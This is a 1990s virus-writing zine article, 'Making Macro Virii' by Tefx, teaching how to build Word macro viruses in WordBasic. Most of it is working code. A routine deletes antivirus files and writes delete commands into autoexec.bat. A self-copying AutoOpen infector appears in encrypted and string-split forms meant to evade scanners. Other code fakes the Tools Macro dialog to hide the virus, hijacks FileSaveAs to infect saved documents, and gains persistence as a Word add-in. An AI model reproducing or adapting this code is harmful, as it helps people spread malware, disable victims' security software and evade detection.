
                       :..::..File 9 Of 14.::..:
                       :...Making Macro Virii..:
                       :.::.:.:.By Tefx.:.:.::.:

<*> tefx@hotmail.com
http://www.infowar.co.uk/ampersand

Making Macro Virii - Another FAQ

[9]  - Retro Commands
[10] - Anti Heuristic (Encryption)
[11] - Stealth (ToolsMacro And File Save)
[12] - Multi Lingual
[13] - Polymorphism
[14] - Advanced and Wierd Techniques

Firstly there are a few things you should know:

1. I am not teaching Word Basic ! I am showing you macro virii
   techniques.
2. I assume you know Basic/WordBasic or are able to comprehend it.
3. I personally assume no responsibility for incidents relating
   indirectly/directly to this article.
4. Most of the techniques shown will be picked up by Av scanners, so
   you will have to use farily complicated techniques to avoid
   detection. (Anti Heuristic)

Warning !
Backup all found copies of "NORMAL.DOT" - I mean it!
Believe me. YOU WON'T REGRET IT !

If you don't yet have an understanding of Basic do so. I will be using
WordBasic (6.0) Not VBA ('97) as I understand it, and it's easier to
make. So if you have 97 look up "equivilant commands" in the VBA help
file.

[9] - Retro Commands

 Retro is where the Virus takes revenge against
 the scanner, deleting it !
 I was going to show you some of the many retro
 virii but i only needed to show you one
 "AntiAVs" : Ingenious. I have only shown the retro
 commands.

 > Sub MAIN
 > t1$ = "Found virus "
 > t2$ = " and has been clean."
 > t3$ = "AntiAVs"
 > DisableInput 1
 > On Error Resume Next
 > AV1$ = Files$("C:\PC-Cillin 95\Scan32.dll")
 > If AV1$ = "" Then Goto AV2
 > SetAttr "c:\autoexec.bat", 0
 > Open "c:\autoexec.bat" For Append As #1
 > Print #1, "@echo off"
 > Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
 > Print #1, "del c:\pc-cil~1\*.dll >nul"
 > Close #1
 > Kill "C:\PC-Cillin 95\Lpt$vpn.*"
 > 'MsgBox t1$ + "PC-CILLIN 95" + t2$, t3$, 48
 > 
 > AV2:
 > AV2$ = Files$("C:\PC-Cillin 97\Scan32.dll")
 > If AV2$ = "" Then Goto AV3
 > SetAttr "c:\autoexec.bat", 0
 > Open "c:\autoexec.bat" For Append As #1
 > Print #1, "@echo off"
 > Print #1, "attrib -h -r -s +a c:\pc-cil~1\*.* >nul"
 > Print #1, "del c:\pc-cil~1\*.dll >nul"
 > Close #1
 > Kill "C:\PC-Cillin 97\Lpt$vpn.*"
 > 'MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48
 > 
 > AV3:
 > AV3$ = Files$("C:\Tsc\PC-Cillin 97\Scan32.dll")
 > If AV3$ = "" Then Goto AV4
 > SetAttr "c:\autoexec.bat", 0
 > Open "c:\autoexec.bat" For Append As #1
 > Print #1, "@echo off"
 > Print #1, "attrib -h -r -s +a c:\tsc\pc-cil~1\*.* >nul"
 > Print #1, "del c:\tsc\pc-cil~1\*.dll >nul"
 > Close #1
 > Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
 > 'MsgBox t1$ + "PC-CILLIN II" + t2$, t3$, 48
 > 
 > AV4:
 > AV4$ = Files$("C:\Zlockav\Gsav.dat")
 > If AV4$ = "" Then Goto AV5
 > Kill AV4$
 > Kill "C:\Zlockav\Gsav.cas"
 > 'MsgBox t1$ + "Zlock" + t2$, t3$, 48
 > 
 > AV5:
 > AV5$ = Files$("C:\VB7\Virus.txt")
 > If AV5$ = "" Then Goto AV6
 > Kill AV5$
 > 'MsgBox t1$ + "VB7/VB95" + t2$, t3$, 48
 > 
 > AV6:
 > AV6$ = Files$("C:\Program Files\Norton AntiVirus\Viruscan.dat")
 > If AV6$ = "" Then Goto AV7
 > Kill AV6$
 > Kill "C:\Program Files\Symantec\Symevnt.386"
 > 'MsgBox t1$ + "NAV95" + t2$, t3$, 48
 > 
 > AV7:
 > AV7$ = Files$("C:\Program Files\McAfee\VirusScan95\Scan.dat")
 > If AV7$ = "" Then Goto AV8
 > Kill AV7$
 > Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
 > 'MsgBox t1$ + "VirusScan95" + t2$, t3$, 48
 > 
 > AV8:
 > AV8$ = Files$("C:\Program Files\McAfee\VirusScan\Scan.dat")
 > If AV8$ = "" Then Goto AV9
 > Kill AV8$
 > Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
 > 'MsgBox t1$ + "VirusScan95 3.0" + t2$, t3$, 48

 > AV9:
 > AV9$ = Files$("C:\Program Files\Command Software\F-PROT95\Sign.def")
 > If AV9$ = "" Then Goto AV10
 > Kill AV9$
 > Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
 > 'MsgBox t1$ + "F-Prot 95" + t2$, t3$, 48
 > 
 > AV10:
 > AV10$ = Files$("C:\Program Files\AntiViral Toolkit Pro\Avp32.exe")
 > If AV10$ = "" Then Goto AV11
 > Kill AV10$
 > Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
 > 'MsgBox t1$ + "AVP 95" + t2$, t3$, 48

 > AV11:
 > AV11$ = Files$("C:\TBAVW95\Tbscan.sig")
 > If AV11$ = "" Then Goto exit
 > SetAttr "c:\autoexec.bat", 0
 > Open "c:\autoexec.bat" For Append As #1
 > Print #1, "@echo off"
 > Print #1, "attrib -h -r -s +a c:\Tbavw95\*.* >nul"
 > Print #1, "del c:\Tbavw95\Tb*.* >nul"
 > Close #1
 > Kill "C:\Tbavw95\Tbavw95.vxd"
 > exit:
 > end sub

[10] - Anti Heuristic (Encryption)

The idea behind ecryption, I belive was first 
concieved by NJ, with the killok virus. the 
prinicpal is simple , and so is the encryption
as any ^real^ encryption would take years as 
wordbasic is so slow !
The reason for encryption (asif it isnt obvious
enough) id to combat heuristic scanners, which 
often just search for MacroCopy in the document
Or RndWord in the case of wazzu

Encrypting a line is easy, it is just adding 1 (or
any number) to the ascii value of the infection code.
A simple macro virii (The Q Virus)

 > On Error Resume Next      'Just Carry on if an error occurs
 > File$=filename$()+":AutoOpen" 'The Active File
 > Global$="Global:AutoOpen" ' The Global Template
 > MacroCopy file$,global$ 
 > FileSaveAs .Format = 1
 > MacroCopy Global$,File$

This is incredibly simple as it requries no 
checking routine: it first tries to copy the macro
from the file to the global template, then tries copy
the macro from the global template to the active file
So it doesnt need to check!

But anywhay back to the encryption, if we add 1 to the
ascii value of each line we get this result

 > Po!Fssps!Sftvnf!Ofyu
 > Gjmf%>gjmfobnf%)*,#;BvupPqfo
 > Hmpcbm%>#Hmpcbm;BvupPqfo#
 > NbdspDpqz!gjmf%-hmpcbm%!
 > GjmfTbwfBt!/Gpsnbu!>!2
 > NbdspDpqz!Hmpcbm%-Gjmf%

So, the autoOpen macro must decrypt the above code
run it then delete it, so we puthe above data into an array
to give this lovely piece of code

Macro AutoOpen
Sub Main
Screen Updating 0
DisableInput 1      ' Stop the user intterupting me
ScreenUpdating 0    ' Stop the user seeing whats really happening
A$(1)="Po!Fssps!Sftvnf!Ofyu"
A$(2)="Gjmf%>gjmfobnf%)*,#;BvupPqfo"
A$(3)="Hmpcbm%>#Hmpcbm;BvupPqfo#"
A$(4)="NbdspDpqz!gjmf%-hmpcbm%!"
A$(5)="GjmfTbwfBt!/Gpsnbu!>!2"
A$(6)="NbdspDpqz!Hmpcbm%-Gjmf%"
ToolsMacro .Name = "Virus", .Show = 1, .Edit '
'Create a new macro to hold the decrypted code
For i = 1 To 6 
    '   
    - Loop for every command
For x = 1 To Len(A$(i)) 'Loop for each 
'Character in the encrypted command
b = Asc(Mid$(A$(i), x, 1))
c = b - 1
If c < 0 Then c = c + 255
d$ = d$ + Chr$(c)
Next x
'decrypt the macro
Insert d$ 'and paste itt into the new file
InsertPara'and press enter
d$ = "" 'clear the decrypted code to start again
Next i 'Onto the next command
DocClose 1 'Close the macro
Virus 'run the code
ToolsMacro .Name = "Virus", .Show = 1, .Delete
'And delete it
End Sub

This works by Decrypting the macro which in turn
copies "AutoOpen" to the global template or the
active file, then the AutoOpen macro deletes the
encrypted version. To include a payload, either
the payload would be added to the encrypted macro
or having a separate encrypted macro.
Keep in mind this process of encryption.

Just as easiy we could insert "+" into the commands to
hide it from the Av scanners
e.g
 > A$(1)="O"+"n E"+"rror"+" R"+"esu"+"me Next"
 > A$(2)="Fil"+"e$"+"=fil"+"ena"+"me$()+"+chr$(34)+":Au"+"toOp"+"en"+chr$(34)
 > A$(3)="Gl"+"oba"+"l$="+chr$(34)+"Gl"+"oba"+"l:A"+"uto"+"Op"+"en"+chr$(34)
 > A$(4)="Ma"+"cro"+"Cop"+"y fil"+"e$,g"+"lob"+"al$ "
 > A$(5)="File"+"Save"+"As"+" ."+"For"+"ma"+"t = 1"
 > A$(6)="Ma"+"croC"+"op"+"y G"+"loba"+"l$,Fi"+"le$"

So withoput the need for encrtpion, an anti heuristic method
is achived, this also means that the macros copying routine
works faster, and its easier to encode

The other proceess is to disguise the caommands
by using the  \ character like this
 > FileSaveAs \
 > .Format=1
Then putting Comments after it
 > FileSaveAs \'Hsjhdshd
 > .Format=1  'hnjdshjd

[11] - Stealth (ToolsMacro And File Save)

The ToolsMacro Problem is that if you try and
run it it will either show you the virus or have a
lame Memory error

+ Removal Method
 > ToolsCustomizeMenus .Name = "ToolsMacro", .Menu = "Tools", .Remove
 Remove ToolsMacro From the menu

+ Lammme Method 1
 When the user tries to run Tools macro
 nothing happens
 > Sub Main
 > End sub

+ Lammme Method 2
 When the user tries to run Tools macro
 a lame memory method runs happens
 > Sub Main
 > MsgBox" WordBasic Memory error -7"
 > End sub

+ Primitive Tools Macro Routine
 This just shows up a fake box with an error
 message when you try to do things.

 > Sub main' ToolsMacro
 > Dim ComboBox1$(0)
 > ComboBox1$(0) = ""
 > Dim ListBox1$(0)
 > ListBox1$(0) = ""
 > Dim DropListBox2$(0)
 > DropListBox2$(0) = "Normal.dot"
 > DisableAutoMacros 0
 > Begin Dialog UserDialog 442, 320, "Macro"
 > PushButton 290, 14, 141, 21, "Rec&ord...", .Definierbar2
 > CancelButton 290, 43, 141, 21
 > PushButton 290, 72, 141, 21, "&Run", .Definierbar3
 > PushButton 290, 102, 141, 21, "&Edit", .Definierbar4
 > PushButton 290, 130, 141, 21, "&Delete", .Definierbar5
 > PushButton 290, 166, 141, 21, "Or&ganizer...", .Definierbar6
 > ComboBox 7, 23, 269, 194, ComboBox1$(), .ComboBox1
 > Text 6, 223, 93, 13, "Macros &Available In:", .Text1
 > Text 7, 259, 109, 13, "Descr&iption:", .Text2
 > Text 7, 6, 93, 13, "Macros:", .Text3
 > ListBox 7, 276, 425, 38, ListBox1$(), .ListBox1
 > DropListBox 6, 238, 425, 19, DropListBox2$(), .ListBox2
 > End Dialog
 > Redim dlg As UserDialog
 > If Dialog(dlg) = 0 Then
 > Cancel
 > Else
 > MsgBox "Not enough memory", "WordBasic Err = 7"
 > End If
 > End Sub

+ The FileSaveAs Problem
 The problem is that once the file is a template word acts like an
 absolute bugger :- check this yourself try FileSaveAs With a template
 Its a git

 The Solution is to create a new file using the infected document(template)
 and then infecting it. complex :-X (Ie we make a new non template clean 
 copy and then do the dirty work)
 I learned his method from "Jackie Querty [29A]" and stole the code from
 his phile

 > Sub FileSaveAs                      ' Our "FileSaveAs" macro
 >   On Error Goto endFileSaveAs       '
 >   Dim dlg As FileSaveAs             ' Declare dlg as FileSaveAs dialog box
 >   GetCurValues dlg                  ' Get current values into dlg
 >   If dlg.Format <> 1 Then           ' Not a template? (i.e. not infected?)
 >     Dialog dlg                      '   No, a clean document, show box
 >     FileSaveAs dlg                  '   Save the new document
 >     Infect(dlg.Name)                '   Infect it! go!
 >   Else                              ' It's a template (i.e. it's infected)
 >     TempWindow = Window()           '   Get current window (template)
 >     OriginalName$ = dlg.Name        '   Get original document name
 >     FileNew .Template = FileName$() '   Create new doc based on template!
 >     On Error Goto CloseDoc          '   Now on: if any error close new doc
 >     GetCurValues dlg                '   Get current values for new doc
 >     dlg.Name = OriginalName$        '   Change doc name for original one
 >     Dialog dlg                      '   Ok, show FileSaveAs dialog box
 >     FileSaveAs dlg                  '   Save the new document
 >     On Error Goto endFileSaveAs     '   Now on: if any error just go
 >     Infect(dlg.Name)                '   Ok, infect new document
 >     If TempWindow >= Window()       '
 >       TempWindow = TempWindow + 1   '   Get old template window number
 >     EndIf                           '
 >     WindowList TempWindow           '   Make it the active window
 >    CloseDoc:                        '
 >     FileClose 2                     '   Close it without promptin
 >   End If                            '
 >  endFileSaveAs:                     ' We're done! "SaveAs" problem fixed!
 > End Sub                             '

[12] - Multi Lingual

Another problem faced by Vx, and we thought MicroShaft
was here to help :) Basically the problem is in the 
Menus, ToolsMacro wont work in the germanversion, as it
is called ExtrasMakro (I Think), so Mtcroshaft to the 
rescue, have provided us with means to solve this problem.

+ Simple method...
 When Infecting Normal.dot dont just do
 > MacroCopy F$,"Global:ToolsMacro"
 Use this as well
 > MacroCopy F$,"Global:ExtrasMakro"
 So you are copying the same macro to the different lingual
 commands.

+ Not as simple as before
 When Writing your macro, write each macro Separately, I.e
 ToolsMacro and ExtrasMakro, one having german buttons
 and messages, the other having englissh buttons :)

[13] - Polymorphism

 Traditionally polymorphism was achived by a method
 of encryption. The encrypted code was dercrypted, 
 then re-encrypted into the new file.

 Lucity in Macro Virii there are easier options to
 tread. In reality when using polymorphism through
 encryption you are showing off, or hiding a well 
 known payload, which could had just as easily been
 encrypted

 There is another method which still uses an encrypted
 macro wich once decrypted, copys the encrypted macro
 to a temp file, then edits the temp file, and copies
 it to the final location, and deletes the temp macro.

 Instead of encryption, there is a method which avoids
 the use of encryption.

 In which a separate macro which name is randomised which
 opens up the non active macros and removes the existing 
 comments (if any) and writes more random comments

 If you have used the encoding method which uses "+" inserted
 randomly, It is probably possible to randomize them
 for instance.

 AutoOpen
  Once decrpted this macro copies the other macros (if needed) 
  and randomizes the macros in the global tempolate

 And the other macros do the same.

If you haven't guessed by now, I see polymoprhism as an action
that may avoid scanners, but the time taken to write the code,
and morph the code, cancels out the usefullness. Stick to the
anti heuristic methods.

Basically , only for those who want to prove a point ;)

[14] - Advanced and Wierd Techniques

+ dRoKz
  Another inspiration by NJ :O , As there is an organizer copy function
  in the language, it can be achived through dialog after dialog.

 > SendKeys "%tm%g%c{ESC}"
  %t - Tools m - Macro : Selects ToolsMacro
  %g : Selects the Organizer
  %c : Copys the macro :0
  {esc} : close all the windows
  
  So this uses the organizer, but a different version must exist for 
  different languages :(

+ The Virtual Boy Method
 Instead of copying itself too the global template, the virus
 copies its self to the default directory, as adds itself to
 the templates list, and so, is a bugger to get rid of, as deleting
 nomal.dot makes no difference

 hehehe... But it makes it harder to have Anti Heuristic capabilities
 :|
 So here we are..the routine to infect normal.dot

 > Sub InfectGlobal
 > 'a$ = Startup Path from WinWord.
 > a$ = DefaultDir$(8) + "\0.dot"
 > 'Where we'regoing to store our macros
 > REM Copy the infected document to this Startup Path.
 > If Files$(a$) = "" Then
 > 'If its Not there 
 > ' This is a good way to check if your infecting a document
 > ' or the global !
 > CopyFile FileName$(), a$
 > 'Copy it
 > REM Enable the virus!
 > AddAddIn a$
 > EndIf
 > End Sub

Then if you're wondering if it was worth it then have a look at this
perfect stealth in macro virii.

 > Sub MAIN
 > REM Get the position of the infected document.
 > b = GetAddInId(DefaultDir$(8) + "\0.dot")
 > REM Set ScreenUpdating Off 
 > ScreenUpdating 0
 > If DocMaximize() Then
 > DocMaximize
 > c = 1
 > EndIf
 > REM Create a new file to hide the virus macros in the active file.
 > FileNew
 > REM Remove now the virus document from the ToolsMacro box.
 > If b Then AddInState 1, 0
 > REM ToolsMacro Options
 > Dim d As ToolsMacro
 > On Error Resume Next
 > Dialog d
 > REM Close the document.
 > FileClose
 > REM Enable now again the virus document.
 > If c Then DocMaximize
 > If b Then AddInState 1, 1
 > REM Show the user the >> clean << Box. ;)
 > ToolsMacro d
 > End Sub

  Trying to replicate this without the special routine is almost
  impossible heheha :)

                       :..::..End Of File..::..:
